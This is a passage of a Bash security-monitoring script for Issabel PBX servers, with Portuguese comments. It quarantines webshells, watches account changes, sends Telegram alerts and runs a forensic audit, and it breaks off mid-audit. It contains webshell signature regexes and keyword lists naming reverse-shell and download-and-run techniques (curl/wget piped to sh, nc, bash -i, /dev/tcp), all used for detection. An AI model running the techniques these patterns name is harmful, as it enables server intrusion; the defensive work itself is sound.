#!/bin/bash
# ==============================================================================
# IPBX SENTINEL - Monitor de integridade web e anti-webshell (PRISMA TELECOM)
# ==============================================================================
# Compativel com Issabel 4 (CentOS 7) e Issabel 5 (Rocky Linux 8).
# Monitor UNICO de seguranca (substitui o antigo monitor_prisma.sh). A varredura de
# arquivos atua so na camada web (/var/www/html); nao toca nos scripts PHP legitimos
# do painel, APIs, WhatsApp ou webhooks. Os checks de host (firewall, dialplan, cron)
# apenas leem; o firewall so e reiniciado se SENTINEL_FIREWALL_HEAL=1. Nunca reinicia o Asterisk.
#
# O QUE FAZ
#  1. Webshells: procura assinaturas conhecidas (caso Emad e eval ofuscado em
#     cadeia, ex.: eval($a($b($c("...")))) ) em arquivos PHP.
#  2. Modulos falsos: diretorios de botnet em /admin/modules (phones, h, _cache,
#     tinfo, fpbxphones).
#  3. PHP em pastas estaticas (images/, img/): nunca deveria existir.
#  4. Contas e senhas: avisa se surgir usuario novo, senha alterada ou removido no
#     painel (acl.db), FreePBX (ampusers), MySQL e arquivos /etc/*.conf de credenciais.
#  5. Host (a cada minuto, leve): firewall parado ou sem regras (so alerta), dialplan malicioso
#     (thanku-outcall), crontab suspeito de asterisk/root e issabel-framework
#     vulneravel (aviso oficial 08/2026): so alertam.
#  6. Autoprotecao: watchdog restaura o proprio Sentinel/cron se forem apagados.
#  7. Para cada achado de arquivo: move para QUARENTENA (reversivel), avisa no Telegram com
#     data/hora, arquivo e IP de origem (quando aparece no log do Apache).
#
# USO
#   ipbx-sentinel --scan           varredura completa (padrao; roda na instalacao e sob demanda)
#   ipbx-sentinel --incremental    so arquivos alterados recentemente (cron)
#   ipbx-sentinel --update-framework  corrige issabel-framework vulneravel (snapshot + yum)
#   ipbx-sentinel --audit [DIAS] [full]   auditoria forense somente-leitura (contas, SSH, cron, processos, portas, rootkit, origem do ataque)
#   ipbx-sentinel --status         mostra se a vigilancia de contas consegue ler painel/MySQL/arquivos
#   ipbx-sentinel --host           so checks de host: firewall, dialplan, cron (cron, 1 min)
#   ipbx-sentinel --install        instala comando, config e cron (/etc/cron.d)
#   ipbx-sentinel --uninstall      remove o cron
#   ipbx-sentinel --list           lista itens em quarentena
#   ipbx-sentinel --restore ARQ    restaura um arquivo da quarentena
#   ipbx-sentinel --baseline       refaz a "foto" de contas/senhas (rode so com o servidor limpo)
#   ipbx-sentinel --test-alert     envia mensagem de teste ao Telegram
#   ipbx-sentinel --set-cliente "Nome" [host:porta]   define o cliente que aparece em TODOS os alertas
#   ipbx-sentinel --install [--cliente "Nome"]        o cliente nos alertas e o nome do host; --cliente e opcional (sobrescreve)
#   ipbx-sentinel --selftest       testa o detector em pasta temporaria
#
# CONFIGURACAO (opcional) em /etc/ipbx/sentinel.conf (root, modo 600):
#   SENTINEL_ACTION=quarantine     # quarantine | alert (apenas avisa)
#   SENTINEL_HEAL_PERMS=0          # 1 = remove escrita de "outros" em arquivos web
#   SENTINEL_FIREWALL_HEAL=0       # 0 = so avisa (padrao; o firewall e gerido pela tela do Issabel) | 1 = tenta reiniciar o servico
#   SENTINEL_AUTO_UPDATE_FRAMEWORK=1  # 1 = ao instalar, atualiza issabel-framework vulneravel (snapshot antes)
# Cliente nos alertas: automatico (nome do host); para sobrescrever, /etc/ipbx/cliente.conf -> CLIENTE_NOME="..."  CLIENTE_ACESSO="host:porta" (opcional)
# Telegram: /etc/ipbx/telegram.conf  ->  TELEGRAM_BOT_TOKEN=...  TELEGRAM_CHAT_ID=...
# Excecoes (falsos positivos): /etc/ipbx/sentinel.allow (um caminho/glob por linha)
# ==============================================================================

WEB_DIR="${WEB_DIR:-/var/www/html}"
CONF_FILE="${SENTINEL_CONF:-/etc/ipbx/sentinel.conf}"
TG_CONF="${SENTINEL_TG_CONF:-/etc/ipbx/telegram.conf}"
ALLOW_FILE="${SENTINEL_ALLOW:-/etc/ipbx/sentinel.allow}"
CLIENTE_CONF="${SENTINEL_CLIENTE_CONF:-/etc/ipbx/cliente.conf}"
QUAR_ROOT="${SENTINEL_QUAR:-/var/backup/ipbx/quarantine}"
LOG_FILE="${SENTINEL_LOG:-/var/log/ipbx-sentinel.log}"
LOCK_FILE="/var/run/ipbx-sentinel.lock"
INTERVAL_MIN=5
STATE_DIR="${SENTINEL_STATE:-/var/lib/ipbx-sentinel}"
ACL_DB="${SENTINEL_ACL_DB:-/var/www/db/acl.db}"
ISSABEL_CONF="${SENTINEL_ISSABEL_CONF:-/etc/issabel.conf}"
CRED_FILES="${SENTINEL_CRED_FILES:-/etc/issabel.conf /etc/amportal.conf /etc/freepbx.conf}"
HOSTNAME_S="$(hostname 2>/dev/null || echo pbx)"

SENTINEL_ACTION="${SENTINEL_ACTION:-quarantine}"
SENTINEL_HEAL_PERMS="${SENTINEL_HEAL_PERMS:-0}"
SENTINEL_FIREWALL_HEAL="${SENTINEL_FIREWALL_HEAL:-0}"
[ -r "$CONF_FILE" ] && . "$CONF_FILE" 2>/dev/null
# Identificacao do cliente nos alertas (/etc/ipbx/cliente.conf: CLIENTE_NOME, CLIENTE_ACESSO opcional)
CLIENTE_NOME=""; CLIENTE_ACESSO=""
[ -r "$CLIENTE_CONF" ] && . "$CLIENTE_CONF" 2>/dev/null
[ -n "${SENTINEL_CLIENTE:-}" ] && CLIENTE_NOME="$SENTINEL_CLIENTE"
# Sem nome configurado: usa o nome do host (tira o prefixo/sufixo "ipbx" para ficar so o nome do cliente)
if [ -z "$CLIENTE_NOME" ]; then
  CLIENTE_NOME="$(printf '%s' "$HOSTNAME_S" | sed -E 's/^[Ii][Pp][Bb][Xx][-.]//; s/[.-][Ii][Pp][Bb][Xx]$//')"
  [ -n "$CLIENTE_NOME" ] || CLIENTE_NOME="$HOSTNAME_S"
fi
SEND_ALERTS="${SENTINEL_NO_ALERT:+0}"
SEND_ALERTS="${SEND_ALERTS:-1}"

# Modulos falsos conhecidos de botnet (nao existem no Issabel/FreePBX homologado)
ROGUE_MODULES=(phones h _cache tinfo fpbxphones)

# Assinaturas (grep -E). Alta confianca: Emad e eval encadeado de variaveis-funcao.
SIG_EMAD='Emad__Was__Here|EmadWasHere'
SIG_CHAIN='eval\(\s*\$[A-Za-z_][A-Za-z0-9_]*\(\s*\$[A-Za-z_][A-Za-z0-9_]*\('
SIG_DECODE='eval\(\s*(base64_decode|gzinflate|gzuncompress|str_rot13)\('
SIG_SUPER='(passthru|shell_exec|system|assert)\(\s*\$_(GET|POST|REQUEST|COOKIE)'
SIG_ALL="${SIG_EMAD}|${SIG_CHAIN}|${SIG_DECODE}|${SIG_SUPER}|c99shell|r57shell"

# Legitimos conhecidos (evita falso positivo): camada de compatibilidade PHP,
# XML_Unserializer (usa doubleval) e referencias somente-leitura do repositorio.
EXCLUDES=(
  -not -path "*/libraries/php-upgrade/*"
  -not -name "XML_Unserializer.php"
  -not -path "*/front_api/pabx_panel/Inspiracoes/*"
  -not -path "*/var/templates_c/*"
)

log() { echo "$(date '+%Y-%m-%d %H:%M:%S') $*" >> "$LOG_FILE" 2>/dev/null; [ -t 1 ] && echo "$*"; return 0; }

load_telegram() {
  TELEGRAM_BOT_TOKEN=""; TELEGRAM_CHAT_ID=""
  [ -r "$TG_CONF" ] && . "$TG_CONF" 2>/dev/null
  if [ -z "$TELEGRAM_BOT_TOKEN" ]; then
    # Compatibilidade: reaproveita as credenciais do monitor ja instalado na frota
    local m
    for m in /usr/local/bin/monitor_prisma.sh /usr/local/bin/monitor_issabel_users.sh /etc/ipbx/monitor_prisma.sh; do
      if [ -r "$m" ]; then
        TELEGRAM_BOT_TOKEN="$(sed -n 's/^TOKEN="\([^"]*\)".*/\1/p' "$m" | head -1)"
        TELEGRAM_CHAT_ID="$(sed -n 's/^CHAT_ID="\([^"]*\)".*/\1/p' "$m" | head -1)"
        [ -n "$TELEGRAM_BOT_TOKEN" ] && break
      fi
    done
  fi
}

# Padrao de notificacao: toda mensagem sai com cliente, servidor, IP e data.
# O chamador passa "TITULO" ou "TITULO\ndetalhes"; o cabecalho e montado aqui.
send_telegram() {
  [ "$SEND_ALERTS" = "1" ] || return 0
  load_telegram
  [ -n "$TELEGRAM_BOT_TOKEN" ] && [ -n "$TELEGRAM_CHAT_ID" ] || { log "Telegram nao configurado; alerta nao enviado."; return 0; }
  local body="$1" icon="" nome="${CLIENTE_NOME:-}" ip title rest msg
  case "$body" in
    ALERTA*|FALHA*) icon="🚨 " ;;
    Firewall\ restabelecido*|*sucesso*) icon="✅ " ;;
    Teste*) icon="🔔 " ;;
  esac
  ip="$(hostname -I 2>/dev/null | awk '{print $1}')"
  title="${body%%$'\n'*}"; rest=""
  case "$body" in *$'\n'*) rest="${body#*$'\n'}" ;; esac
  msg="${icon}[${nome}] ${title}"$'\n'"🏢 Cliente: ${nome}"$'\n'"🖥 Servidor: ${HOSTNAME_S}${ip:+ ($ip)}"
  [ -n "$CLIENTE_ACESSO" ] && msg+=$'\n'"🔗 Acesso: ${CLIENTE_ACESSO}"
  msg+=$'\n'"🕒 $(date '+%d/%m/%Y %H:%M:%S')"
  [ -n "$rest" ] && msg+=$'\n\n'"${rest}"
  curl -s -m 15 -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
       --data-urlencode "chat_id=${TELEGRAM_CHAT_ID}" --data-urlencode "text=${msg}" >/dev/null 2>&1 || log "Falha ao enviar Telegram."
}

# Grava o nome do cliente (usado em todos os alertas). Sem aspas/cifrao/crase para nao quebrar o .conf.
set_cliente() {
  local nome acesso="${2:-}"
  nome="$(printf '%s' "$1" | tr -d '"`$\\\r\n' | sed 's/^ *//;s/ *$//' | cut -c1-60)"
  [ -n "$nome" ] || { echo "Informe o nome do cliente: ipbx-sentinel --set-cliente \"Nome do cliente\""; return 1; }
  acesso="$(printf '%s' "$acesso" | tr -d '"`$\\\r\n ' | cut -c1-120)"
  mkdir -p "$(dirname "$CLIENTE_CONF")"
  ( umask 077; printf '# Identificacao do cliente nos alertas do Telegram\nCLIENTE_NOME="%s"\nCLIENTE_ACESSO="%s"\n' "$nome" "$acesso" > "$CLIENTE_CONF" )
  chmod 600 "$CLIENTE_CONF" 2>/dev/null
  CLIENTE_NOME="$nome"; CLIENTE_ACESSO="$acesso"
  echo "Cliente definido: ${nome} ($CLIENTE_CONF)"
}

is_allowed() {  # $1 = caminho
  [ -r "$ALLOW_FILE" ] || return 1
  local pat
  while IFS= read -r pat; do
    case "$pat" in ''|\#*) continue ;; esac
    # shellcheck disable=SC2254
    case "$1" in $pat) return 0 ;; esac
  done < "$ALLOW_FILE"
  return 1
}

# IPs que acessaram a URL do arquivo (melhor esforco, logs do Apache)
source_ips() {
  local rel="${1#$WEB_DIR}" l out=""
  for l in ${SENTINEL_ACCESS_LOGS:-/var/log/httpd/access_log /var/log/httpd/ssl_access_log /var/log/apache2/access.log}; do
    [ -r "$l" ] || continue
    out="$out$(tail -n 100000 "$l" 2>/dev/null | grep -F -- "$rel" | awk '{print $1}')"$'\n'
  done
  echo "$out" | sed '/^$/d' | sort | uniq -c | sort -rn | head -3 | awk '{printf "%s(%sx) ", $2, $1}'
}

QUAR_DIR=""
FOUND=()   # linhas "motivo|caminho|destino|ips"

quarantine() {  # $1 = caminho, $2 = motivo
  local f="$1" why="$2" dest="" ips
  is_allowed "$f" && return 0
  [ -e "$f" ] || return 0
  ips="$(source_ips "$f")"
  if [ "$SENTINEL_ACTION" = "quarantine" ]; then
    [ -n "$QUAR_DIR" ] || { QUAR_DIR="$QUAR_ROOT/$(date '+%Y-%m-%d_%H%M%S')"; mkdir -p "$QUAR_DIR" && chmod 700 "$QUAR_ROOT" "$QUAR_DIR" 2>/dev/null; }
    dest="$QUAR_DIR/${f#/}"
    mkdir -p "$(dirname "$dest")" && mv -f "$f" "$dest" 2>/dev/null && { [ -d "$dest" ] || chmod 000 "$dest" 2>/dev/null; }
    printf '%s\t%s\t%s\t%s\n' "$(date '+%F %T')" "$f" "$dest" "$why" >> "$QUAR_ROOT/INDEX.tsv" 2>/dev/null
  fi
  FOUND+=("${why}|${f}|${dest}|${ips}")
  log "ACHADO [$why] $f -> ${dest:-(somente alerta)} ${ips:+IPs: $ips}"
}

scan_signatures() {  # $1 = "full" | "inc"
  local -a find_args=("$WEB_DIR" -type f \( -iname '*.php' -o -iname '*.phtml' -o -iname '*.phar' -o -iname '*.inc' -o -iname '*.php[3-8]' \))
  [ "$1" = "inc" ] && find_args+=(-mmin "-$((INTERVAL_MIN * 2))")
  find_args+=("${EXCLUDES[@]}" -print0)
  local f why
  while IFS= read -r -d '' f; do
    if grep -qE "$SIG_EMAD" "$f" 2>/dev/null; then why="assinatura Emad"
    elif grep -qE "$SIG_CHAIN" "$f" 2>/dev/null; then why="eval ofuscado em cadeia"
    elif grep -qE "$SIG_DECODE" "$f" 2>/dev/null; then why="eval de codigo decodificado"
    elif grep -qE "$SIG_SUPER" "$f" 2>/dev/null; then why="execucao de comando via requisicao"
    elif grep -qE 'c99shell|r57shell' "$f" 2>/dev/null; then why="webshell conhecida"
    else continue; fi
    quarantine "$f" "$why"
  done < <(find "${find_args[@]}" 2>/dev/null | xargs -0 -r grep -lZE "$SIG_ALL" 2>/dev/null)
}

scan_rogue_modules() {
  local m d
  for m in "${ROGUE_MODULES[@]}"; do
    d="$WEB_DIR/admin/modules/$m"
    [ -d "$d" ] && quarantine "$d" "modulo falso de botnet"
  done
}

scan_static_php() {
  local f
  while IFS= read -r -d '' f; do
    quarantine "$f" "PHP em pasta de imagens"
  done < <(find "$WEB_DIR" -type f \( -iname '*.php' -o -iname '*.phtml' -o -iname '*.phar' -o -iname '*.php[3-8]' \) \
            \( -path '*/images/*' -o -path '*/img/*' \) -not -path "*/front_api/pabx_panel/Inspiracoes/*" -print0 2>/dev/null)
}

heal_perms() {
  [ "$SENTINEL_HEAL_PERMS" = "1" ] || return 0
  # Conservador: apenas remove escrita de "outros" (nunca chmod/chown recursivo geral)
  local n
  n="$(find "$WEB_DIR" -type f -perm -0002 -not -path "*/var/templates_c/*" 2>/dev/null | wc -l)"
  [ "$n" -gt 0 ] && find "$WEB_DIR" -type f -perm -0002 -not -path "*/var/templates_c/*" -exec chmod o-w {} + 2>/dev/null
  log "Permissoes: escrita de 'outros' removida de $n arquivo(s)."
}


# ------------------------------------------------------------------------------
# VIGILANCIA DE CONTAS E SENHAS (caso Emad: invasor entrou como admin e alterou
# usuario do banco). Compara com uma "foto" da instalacao limpa. So ALERTA: nunca
# desfaz sozinho, pois uma troca de senha pode ser legitima. Hashes nao vao ao alerta.
# ------------------------------------------------------------------------------
IDENT_CHANGES=()

mysql_cmd() {  # $1 = SQL
  command -v mysql >/dev/null 2>&1 || return 1
  local pw=""
  [ -r "$ISSABEL_CONF" ] && pw="$(sed -n 's/^mysqlrootpwd=//p' "$ISSABEL_CONF" | head -1)"
  MYSQL_PWD="$pw" mysql -uroot -N -B -e "$1" 2>/dev/null
}

hash_line() { printf '%s' "$1" | sha256sum | awk '{print $1}'; }

identity_snapshot() {
  local out rc
  # Cada fonte so entra na comparacao se foi lida com sucesso (marca "ok|fonte"),
  # para uma leitura que falhou (ex.: banco fora do ar) nunca virar falso "removido".
  if command -v sqlite3 >/dev/null 2>&1 && [ -r "$ACL_DB" ]; then
    out="$(sqlite3 -separator '|' "$ACL_DB" "SELECT u.name, u.md5_password, IFNULL(group_concat(m.id_group),'') FROM acl_user u LEFT JOIN acl_membership m ON m.id_user=u.id GROUP BY u.id ORDER BY u.name;" 2>/dev/null)"; rc=$?
    if [ $rc -eq 0 ]; then echo "ok|painel|1"; echo "$out" | while IFS='|' read -r a b c; do [ -n "$a" ] && echo "painel|$a|$(hash_line "$b|$c")"; done; fi
  fi
  out="$(mysql_cmd "SELECT username, IFNULL(password_sha1,''), IFNULL(sections,'') FROM asterisk.ampusers ORDER BY username;")"; rc=$?
  if [ $rc -eq 0 ]; then echo "ok|freepbx|1"; echo "$out" | while IFS=$'\t' read -r a b c; do [ -n "$a" ] && echo "freepbx|$a|$(hash_line "$b|$c")"; done; fi
  out="$(mysql_cmd "SELECT CONCAT(User,'@',Host), IFNULL(Password,'') FROM mysql.user ORDER BY User,Host;")"; rc=$?
  [ $rc -ne 0 ] && { out="$(mysql_cmd "SELECT CONCAT(User,'@',Host), IFNULL(authentication_string,'') FROM mysql.user ORDER BY User,Host;")"; rc=$?; }
  if [ $rc -eq 0 ]; then echo "ok|mysql|1"; echo "$out" | while IFS=$'\t' read -r a b; do [ -n "$a" ] && echo "mysql|$a|$(hash_line "$b")"; done; fi
  local f
  for f in $CRED_FILES; do [ -r "$f" ] && echo "arquivo|$f|$(sha256sum "$f" | awk '{print $1}')"; done
  [ -n "$CRED_FILES" ] && echo "ok|arquivo|1"
  return 0
}

identity_check() {
  mkdir -p "$STATE_DIR" 2>/dev/null && chmod 700 "$STATE_DIR" 2>/dev/null
  local base="$STATE_DIR/identity.baseline" now="$STATE_DIR/identity.now"
  identity_snapshot | sort > "$now"
  # Fonte ilegivel = vigilancia cega naquela parte: avisa no log (uma vez por fonte)
  local fs
  for fs in painel freepbx mysql; do
    grep -qF "ok|$fs|" "$now" || { seen_once "cega|$fs" && log "AVISO: vigilancia de contas SEM leitura da fonte '$fs'. Diagnostico: ipbx-sentinel --status"; }
  done
  # Nomes suspeitos (caso real: usuario "atmin" no MySQL, sosia de "admin"). Independe da
  # foto: pega ate servidor ja invadido. Avisa uma unica vez por conta.
  local flagged="$STATE_DIR/identity.flagged" t0 k0 h0 n0
  while IFS='|' read -r t0 k0 h0; do
    [ "$t0" = "ok" ] && continue
    n0="${k0%%@*}"; n0="$(printf '%s' "$n0" | tr 'A-Z' 'a-z')"
    # root do MySQL liberado para qualquer origem (host %): acesso remoto total ao banco
    if [ "$t0" = "mysql" ] && [ "$n0" = "root" ]; then
      case "${k0#*@}" in *%*) grep -qxF "$t0|$k0" "$flagged" 2>/dev/null || { echo "$t0|$k0" >> "$flagged"; chmod 600 "$flagged" 2>/dev/null; IDENT_CHANGES+=("ROOT REMOTO ($t0): $k0 (root do MySQL aceita conexao de qualquer lugar)"); } ;; esac
    fi
    case "$n0" in
      emad|supportpbx|atmin|admln|adm1n|admim|admn|4dmin|hacker|backdoor|webadmin1|sqladmin)
        grep -qxF "$t0|$k0" "$flagged" 2>/dev/null || { echo "$t0|$k0" >> "$flagged"; chmod 600 "$flagged" 2>/dev/null; IDENT_CHANGES+=("NOME SUSPEITO ($t0): $k0 (parecido com admin / usado em invasoes)"); } ;;
    esac
  done < "$now"
  if [ ! -s "$base" ]; then
    [ -s "$now" ] || { seen_once "identidade-cega" && log "AVISO: vigilancia de contas INATIVA (nenhuma fonte legivel). Diagnostico: ipbx-sentinel --status"; }
    if [ -s "$now" ]; then cp -f "$now" "$base"; chmod 600 "$base" "$now"; log "Foto inicial de contas/senhas criada ($(wc -l < "$base") itens). Garanta que o servidor estava limpo neste momento."; fi
    return 0
  fi
  if [ ! -s "$now" ]; then   # sem leitura (ex.: banco fora do ar): nao conclui nada, mas avisa (uma vez)
    seen_once "identidade-cega" && log "AVISO: vigilancia de contas INATIVA (nenhuma fonte legivel). Diagnostico: ipbx-sentinel --status"
    return 0
  fi
  # Fonte lida pela 1a vez (ex.: MySQL ficou acessivel agora): entra na foto sem alarme
  local src
  for src in painel freepbx mysql arquivo; do
    if grep -qF "ok|$src|" "$now" && ! grep -qF "ok|$src|" "$base"; then
      grep -E "^(ok\|)?$src\|" "$now" >> "$base"; sort -u -o "$base" "$base"; log "Fonte '$src' adicionada a foto de contas."
    fi
  done
  local k t
  # novos ou alterados
  while IFS='|' read -r t k h; do
    [ "$t" = "ok" ] && continue
    local old; old="$(grep -F "$t|$k|" "$base" | head -1 | cut -d'|' -f3)"
    if [ -z "$old" ]; then grep -qF "ok|$t|" "$base" && IDENT_CHANGES+=("NOVO ($t): $k")
    elif [ "$old" != "$h" ]; then IDENT_CHANGES+=("ALTERADO ($t): $k (senha/permissoes mudaram)"); fi
  done < "$now"
  # removidos
  while IFS='|' read -r t k h; do
    [ "$t" = "ok" ] && continue
    grep -qF "ok|$t|" "$now" || continue            # fonte nao lida agora: nao conclui
    grep -qF "$t|$k|" "$now" || IDENT_CHANGES+=("REMOVIDO ($t): $k")
  done < "$base"
  if [ "${#IDENT_CHANGES[@]}" -gt 0 ]; then
    cp -f "$base" "$base.prev" 2>/dev/null
    { cat "$now"; while IFS='|' read -r t k h; do [ "$t" = "ok" ] || grep -qF "ok|$t|" "$now" || echo "$t|$k|$h"; done < "$base"; grep -F 'ok|' "$base" | while read -r l; do grep -qF "$l" "$now" || echo "$l"; done; } | sort -u > "$base.new" && mv -f "$base.new" "$base"
    chmod 600 "$base" "$base.prev" "$now" 2>/dev/null   # alerta uma vez; nova foto passa a valer (fontes nao lidas ficam como estavam)
  fi
}

# Diagnostico: quais fontes de contas/senhas o Sentinel consegue ler neste servidor
identity_status() {
  local pw="" n
  echo "Vigilancia de contas e senhas - fontes:"
  if ! command -v sqlite3 >/dev/null 2>&1; then echo "  [X] painel (acl.db): comando sqlite3 nao instalado (yum install -y sqlite)"
  elif [ ! -r "$ACL_DB" ]; then echo "  [X] painel (acl.db): arquivo $ACL_DB nao encontrado/legivel"
  else n="$(sqlite3 "$ACL_DB" 'SELECT count(*) FROM acl_user;' 2>/dev/null)" && echo "  [OK] painel (acl.db): ${n} usuario(s)" || echo "  [X] painel (acl.db): consulta falhou"; fi
  if ! command -v mysql >/dev/null 2>&1; then echo "  [X] MySQL/FreePBX: comando mysql nao instalado"
  else
    [ -r "$ISSABEL_CONF" ] && pw="$(sed -n 's/^mysqlrootpwd=//p' "$ISSABEL_CONF" | head -1)"
    if n="$(MYSQL_PWD="$pw" mysql -uroot -N -B -e 'SELECT count(*) FROM mysql.user;' 2>/dev/null)"; then echo "  [OK] MySQL: ${n} usuario(s) (root acessivel)"
    else echo "  [X] MySQL: nao foi possivel entrar como root (senha em $ISSABEL_CONF ausente ou diferente?)"; fi
  fi
  local f; for f in $CRED_FILES; do [ -r "$f" ] && echo "  [OK] arquivo $f" || echo "  [--] arquivo $f (nao existe)"; done
}

# ------------------------------------------------------------------------------
# AUDITORIA FORENSE (somente leitura): o que um invasor costuma deixar para tras alem
# dos arquivos web. Nao altera nada. Relatorio tambem em /var/log/ipbx-sentinel-audit-*.txt
# ------------------------------------------------------------------------------
cmd_audit() {
  local days="${1:-30}" mode="${2:-quick}" AF=0 out ts; ts="$(date '+%Y%m%d_%H%M%S')"
  out="${SENTINEL_AUDIT_OUT:-/var/log/ipbx-sentinel-audit-${ts}.txt}"
  { 
  sec()  { echo; echo "== $* =="; }
  warn() { echo "  [!] $*"; AF=$((AF+1)); }
  info() { echo "  $*"; }
  echo "AUDITORIA IPbx Sentinel - ${HOSTNAME_S} - $(date '+%d/%m/%Y %H:%M:%S') (arquivos alterados nos ultimos ${days} dias)"

  sec "1. Contas do sistema e acesso SSH"
  awk -F: '$3==0 && $1!="root"{print $1}' /etc/passwd 2>/dev/null | while read -r u; do warn "usuario com UID 0 alem do root: $u"; done
  awk -F: '$3>=1000 && $7 !~ /(nologin|false)$/ {print "  usuario com shell de login: "$1" (uid "$3")"}' /etc/passwd 2>/dev/null
  local d f
  for d in /root $(awk -F: '$7 !~ /(nologin|false|sync|shutdown|halt)$/ && $6 ~ /^\// {print $6}' /etc/passwd 2>/dev/null | sort -u); do
    f="$d/.ssh/authorized_keys"; [ -s "$f" ] || continue
    info "chaves SSH em $f:"; command -v ssh-keygen >/dev/null 2>&1 && ssh-keygen -lf "$f" 2>/dev/null | sed 's/^/     /'
    warn "confira se TODAS as chaves acima sao suas ($f)"
  done
  grep -rhE 'NOPASSWD' /etc/sudoers /etc/sudoers.d 2>/dev/null | grep -v '^\s*#' | while read -r l; do
    if echo "$l" | grep -qE 'NOPASSWD:\s*ALL\s*$'; then warn "sudo SEM SENHA PARA QUALQUER COMANDO (nao e padrao do Issabel): $l"; else info "sudo (comando especifico): $l"; fi
  done
  grep -hiE '^\s*(PermitRootLogin|PasswordAuthentication|Port)\s' /etc/ssh/sshd_config 2>/dev/null | sed 's/^/  sshd: /'

  sec "2. Agendamentos (cron)"
  local u pat='curl|wget|base64|/tmp/|/dev/shm|/var/tmp|nc -|bash -i|python -c|perl -e|\.sh *>|supportpbx|emad|postroot'
  for u in $(cut -d: -f1 /etc/passwd 2>/dev/null); do
    crontab -l -u "$u" 2>/dev/null | grep -v '^#' | grep -E "$pat" | while read -r l; do warn "cron de $u: $l"; done
  done
  # um aviso por arquivo (com a 1a linha e a contagem); ignora o que e do proprio Sentinel/painel e o atualizador GeoIP do firewall
  grep -rcE "$pat" /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/crontab 2>/dev/null | grep -vE ':0$|ipbx-sentinel|ipbx-watchdog|ipbx-front-api|geoip_update' | while IFS=: read -r f n; do
    warn "$f ($n linha(s) suspeita(s)); 1a: $(grep -E "$pat" "$f" | grep -v '^\s*#' | head -1 | cut -c1-110)"
  done
  info "arquivos em /etc/cron.d: $(ls /etc/cron.d 2>/dev/null | tr '\n' ' ')"

  sec "3. Processos suspeitos"
  local pid exe
  for pid in $(ls /proc 2>/dev/null | grep -E '^[0-9]+$'); do
    exe="$(readlink "/proc/$pid/exe" 2>/dev/null)" || continue
    case "$exe" in
      /tmp/*|/var/tmp/*|/dev/shm/*|*"(deleted)"*) warn "processo $pid rodando de local suspeito: $exe ($(tr '\0' ' ' < /proc/$pid/cmdline 2>/dev/null | cut -c1-80))" ;;
    esac
  done
  pgrep -af 'sipsentinel/agent\.py|svmap|svwar|svcrack|sipvicious' 2>/dev/null | head -5 | while read -r l; do warn "PROCESSO DE ATAQUE SIP em execucao (botnet): $(echo "$l" | cut -c1-120)"; done
  info "maiores consumidores de CPU:"; ps -eo pid,user,pcpu,comm --sort=-pcpu 2>/dev/null | head -6 | sed 's/^/     /'

  sec "4. Portas abertas"
  ss -tlnpH 2>/dev/null | awk '{print "  TCP "$4"  "$6}' | head -30
  ss -tlnH 2>/dev/null | awk '{print $4}' | grep -E '^(\*|0\.0\.0\.0|\[::\]):(3306|5038|5432|6379|27017|11211|9200)$' | while read -r l; do warn "porta sensivel aberta para todas as interfaces: $l"; done

  sec "5. Persistencia e rootkit"
  for f in /opt/sipsentinel /etc/sipsentinel /tmp/.sipvicious-home; do [ -e "$f" ] && warn "pasta de ferramenta de ataque SIP (botnet): $f"; done
  [ -s /etc/ld.so.preload ] && warn "/etc/ld.so.preload existe (tipico de rootkit): $(cat /etc/ld.so.preload | head -3 | tr '\n' ' ')"
  for f in /etc/rc.local /etc/rc.d/rc.local; do
    [ -r "$f" ] || continue
    grep -vE '^\s*(#|$)' "$f" 2>/dev/null | while read -r l; do
      if echo "$l" | grep -qE '(curl|wget)[^|]*\|[^|]*(ba)?sh|postroot|nc -|/dev/tcp|base64'; then warn "$f BAIXA/EXECUTA SCRIPT REMOTO NO BOOT: $l"; else info "$f: $l"; fi
    done
  done
  for f in /etc/passwd /etc/shadow /etc/group /etc/gshadow /etc/sudoers /etc/rc.local /etc/rc.d/rc.local /etc/crontab /var/spool/cron/root /var/spool/cron/asterisk; do
    [ -e "$f" ] && lsattr -d "$f" 2>/dev/null | awk '{print $1}' | grep -qE 'i|a' && warn "atributo imutavel/append-only em $f (invasor impede remocao): chattr -i -a $f"
  done
  find /etc/systemd/system /usr/lib/systemd/system -type f -name '*.service' -mtime "-${days}" 2>/dev/null | head -10 | while read -r l; do
    if own="$(rpm -qf "$l" 2>/dev/null | head -1)" && [ -n "$own" ] && ! echo "$own" | grep -qiE 'not owned|nenhum pacote'; then own="pacote: $own"; else own="NENHUM PACOTE: nao veio de instalacao oficial"; fi
    warn "servico systemd criado/alterado recentemente: $l  ($own)"
    grep -E '^(ExecStart|ExecStartPre|ExecStartPost)=' "$l" 2>/dev/null | cut -c1-140 | sed 's/^/        /'
  done
  find /tmp /var/tmp /dev/shm -type f \( -name '*.php' -o -name '*.sh' -o -perm -u+x \) 2>/dev/null | head -15 | while read -r l; do warn "arquivo suspeito em area temporaria: $l"; done

  sec "6. Binarios do sistema alterados"
  if command -v rpm >/dev/null 2>&1; then
    if [ "$mode" = "full" ]; then
      info "modo COMPLETO: verificando TODOS os pacotes (pode levar muitos minutos)..."
      timeout 3600 rpm -Va --noconfig 2>/dev/null | awk '$1 ~ /^..5/ && $2!="c" {print $NF}' | grep -E '^/(usr/)?(s?bin)/|^/usr/lib64?/' | head -40 | while read -r l; do warn "arquivo diferente do pacote original: $l"; done
    else
      # Rapido (segundos): compara o hash de cada ferramenta critica com o do pacote que a instalou
      local crit="ls ps ss netstat ifconfig ip lsof top pgrep pkill killall who w last lastlog id stat find grep sed bash login passwd su sudo ssh sshd scp crontab crond curl wget chattr lsattr systemctl service iptables rpm yum useradd userdel usermod md5sum sha256sum readlink dmesg lsmod" b f real line dg calc n=0 bad=0 seen=" "
      for b in $crit; do
        for f in /usr/bin/$b /usr/sbin/$b /bin/$b /sbin/$b; do
          [ -f "$f" ] || continue
          real="$(readlink -f "$f" 2>/dev/null)"; [ -f "$real" ] || continue
          case "$seen" in *" $real "*) continue ;; esac; seen="$seen$real "
          n=$((n+1))
          # CentOS 7: /bin e /sbin sao links para /usr/bin e /usr/sbin, mas varios pacotes (grep, sed, net-tools, rpm)
          # registram o caminho antigo (/bin/grep). Tenta todas as grafias antes de acusar "sem pacote".
          line=""; local cand
          for cand in "$f" "$real" "${real/#\/usr\/bin\//\/bin\/}" "${real/#\/usr\/sbin\//\/sbin\/}" "${real/#\/bin\//\/usr\/bin\/}" "${real/#\/sbin\//\/usr\/sbin\/}"; do
            line="$(rpm -q --dump -f "$cand" 2>/dev/null | awk -v p="$cand" '$1==p{print; exit}')"
            [ -n "$line" ] && break
